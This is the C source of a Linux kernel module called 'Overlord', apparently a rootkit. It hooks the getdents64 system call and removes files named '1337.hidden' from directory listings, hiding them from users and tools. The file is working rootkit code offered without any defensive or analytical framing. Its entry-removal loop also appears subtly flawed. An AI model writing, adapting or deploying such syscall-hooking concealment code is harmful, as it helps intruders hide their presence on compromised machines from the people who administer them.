#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/linkage.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

#include <linux/dirent.h>

#include "syscall.h"

MODULE_LICENSE("GPL"); // nt torvalds

asmlinkage long getdents64_hide(struct pt_regs *regs) {
    long size = (orig_syscall(__NR_getdents64))(regs);
    long nsize = size;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user*)regs->si;

    // Allocate and copy dirent array from userspace
    char *buf = kmalloc(size, GFP_KERNEL);
    if (!buf)
        goto ret;

    if (copy_from_user(buf, dirent, size))
        goto ret;

    struct linux_dirent64 *dir = NULL;
    for (unsigned long offset = 0; offset < nsize; offset += dir->d_reclen) {
        dir = (struct linux_dirent64*)(buf + offset);
        if (!strcmp("1337.hidden", dir->d_name)) {
            nsize -= dir->d_reclen;
            if (offset < nsize)
                memcpy(buf + offset, buf + offset + dir->d_reclen, nsize - offset);
            continue;
        }
    }

    if (copy_to_user(dirent, buf, size))
        nsize = size;

ret:
    kfree(buf);
    return nsize;
}


static int __init overlord_init(void) {
    syscall_setup();
    printk(KERN_INFO "[Overlord] Hello World!\n");
    hook_syscall(&getdents64_hide, __NR_getdents64);
    return 0;
}

static void __exit overlord_exit(void) {
    syscall_rollback();
    printk(KERN_INFO "[Overlord] Goodbye World!\n");
}

module_init(overlord_init);
module_exit(overlord_exit);
